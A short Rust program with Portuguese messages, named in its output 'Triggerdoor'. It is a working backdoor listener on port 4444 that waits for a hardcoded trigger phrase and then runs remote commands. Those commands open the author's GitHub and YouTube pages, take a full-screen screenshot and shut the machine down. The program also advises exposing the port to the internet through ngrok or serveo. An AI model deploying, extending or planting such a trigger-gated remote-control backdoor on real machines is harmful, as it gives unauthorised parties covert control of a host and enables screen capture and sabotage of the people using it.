use std::io::{BufRead, BufReader, Write};
use std::net::{TcpListener, TcpStream};
use std::process::Command;

const LISTEN_ADDR: &str = "0.0.0.0:4444";
const TRIGGER: &str = "magicword:mairink";

fn handle_client(mut stream: TcpStream) {
    let peer = stream.peer_addr().unwrap();
    println!("[+] Conexão recebida de {}", peer);

    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut buffer = String::new();

    match reader.read_line(&mut buffer) {
        Ok(_) => {
            buffer = buffer.trim().to_string();
            println!("[>] Recebido: {}", buffer);

            if buffer == TRIGGER {
                writeln!(stream, "[+] Trigger correto recebido. Modo interativo ativado...\n").unwrap();

                let mut reader = BufReader::new(stream.try_clone().unwrap());
                loop {
                    buffer.clear();
                    if let Ok(bytes) = reader.read_line(&mut buffer) {
                        if bytes == 0 {
                            break;
                        }
                        let command = buffer.trim();
                        let response = match command {
                            "#open_github" => {
                                let result = Command::new("xdg-open")
                                    .arg("https://github.com/mairinkdev")
                                    .output()
                                    .or_else(|_| {
                                        Command::new("explorer.exe") // fallback WSL
                                            .arg("https://github.com/mairinkdev")
                                            .output()
                                    });
                                match result {
                                    Ok(_) => "[+] GitHub aberto.\n".to_string(),
                                    Err(e) => format!("[x] Falha ao abrir GitHub: {}\n", e),
                                }
                            }
                            "#open_youtube" => {
                                let result = Command::new("xdg-open")
                                    .arg("https://youtube.com/@mairinkdev")
                                    .output()
                                    .or_else(|_| {
                                        Command::new("explorer.exe")
                                            .arg("https://youtube.com/@mairinkdev")
                                            .output()
                                    });
                                match result {
                                    Ok(_) => "[+] YouTube aberto.\n".to_string(),
                                    Err(e) => format!("[x] Falha ao abrir YouTube: {}\n", e),
                                }
                            }
                            "#screenshot" => {
                                let result = Command::new("import")
                                    .args(["-window", "root", "screenshot.jpg"])
                                    .output();
                                match result {
                                    Ok(_) => "[+] Screenshot salva como screenshot.jpg\n".to_string(),
                                    Err(e) => format!("[x] Falha ao tirar screenshot: {}\n", e),
                                }
                            }
                            "#shutdown" => {
                                let result = Command::new("shutdown")
                                    .arg("-h")
                                    .arg("now")
                                    .output();
                                match result {
                                    Ok(_) => "[!] Desligando sistema...\n".to_string(),
                                    Err(e) => format!("[x] Falha no shutdown: {}\n", e),
                                }
                            }
                            _ => format!("[x] Comando não reconhecido: {}\n", command),
                        };

                        let _ = stream.write_all(response.as_bytes());
                    }
                }
            } else {
                writeln!(stream, "[x] Trigger incorreto. Encerrando.").unwrap();
            }
        }
        Err(e) => {
            eprintln!("[!] Erro ao ler do cliente: {}", e);
        }
    }
}

fn main() {
    println!("[*] Triggerdoor escutando em {}...", LISTEN_ADDR);
    println!("[*] Use ngrok ou serveo.net para expor a porta para a internet");

    let listener = TcpListener::bind(LISTEN_ADDR).expect("Falha ao iniciar listener");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                std::thread::spawn(|| handle_client(stream));
            }
            Err(e) => {
                eprintln!("[!] Erro de conexão: {}", e);
            }
        }
    }
}

